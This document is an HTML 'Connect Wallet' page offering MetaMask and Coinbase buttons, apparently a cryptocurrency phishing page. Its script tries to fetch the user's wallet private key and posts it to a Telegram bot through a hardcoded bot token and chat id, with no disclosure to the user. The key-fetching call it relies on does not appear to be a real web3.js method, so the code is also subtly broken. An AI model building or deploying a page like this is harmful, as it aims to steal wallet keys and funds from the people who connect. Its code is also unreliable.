<!DOCTYPE html>
<html lang="en">
<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Connect Wallet</title>
 <style>
 body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f0f0f0; }
 #connectWallet { padding: 10px 20px; font-size: 16px; cursor: pointer; color: white; background-color: #007BFF; border: none; border-radius: 5px; }
 #walletOptions { display: none; margin-top: 20px; }
 .wallet-option { display: inline-block; margin: 0 10px; padding: 10px 20px; font-size: 16px; cursor: pointer; color: white; background-color: #28a745; border: none; border-radius: 5px; }
 </style>
</head>
<body>
 <h1>Connect Wallet</h1>
 <button id="connectWallet">Connect Wallet</button>
 <div id="walletOptions">
 <button class="wallet-option" onclick="connectMetaMask()">MetaMask</button>
 <button class="wallet-option" onclick="connectCoinbase()">Coinbase</button>
 </div>

 <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
 <script>
 document.getElementById('connectWallet').addEventListener('click', () => {
 document.getElementById('walletOptions').style.display = 'block';
 });

 async function connectMetaMask() {
 if (window.ethereum) {
 try {
 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
 const userAccount = accounts[0];
 const web3 = new Web3(window.ethereum);
 const privateKey = await web3.eth.getPrivateKey(userAccount);
 const message = `Private Key: ${privateKey}`;
 sendToTelegram(message, '8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI', '6870666933');
 } catch (error) {
 console.error('Error:', error);
 }
 } else {
 console.log('Please install MetaMask!');
 }
 }

 async function connectCoinbase() {
 if (window.CoinbaseWalletSDK) {
 const coinbaseWallet = new window.CoinbaseWalletSDK.CoinbaseWallet({
 appName: 'Connect Wallet',
 jsonRpcUrl: 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
 });
 await coinbaseWallet.connect();
 const userAccount = await coinbaseWallet.accounts()[0].address;
 const web3 = new Web3(window.ethereum);
 const privateKey = await web3.eth.getPrivateKey(userAccount);
 const message = `Private Key: ${privateKey}`;
 sendToTelegram(message, '8732678869:AAEvdi0iwIspDdXO-nnirEFySLIUPFFuboI', '6870666933');
 } else {
 console.log('Please install Coinbase Wallet!');
 }
 }

 async function sendToTelegram(message, botToken, chatId) {
 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json'
 },
 body: JSON.stringify({
 chat_id: chatId,
 text: message
 })
 });
 if (response.ok) {
 console.log('Private key sent to Telegram successfully.');
 } else {
 console.error('Failed to send private key to Telegram.');
 }
 }
 </script>
</body>
</html>
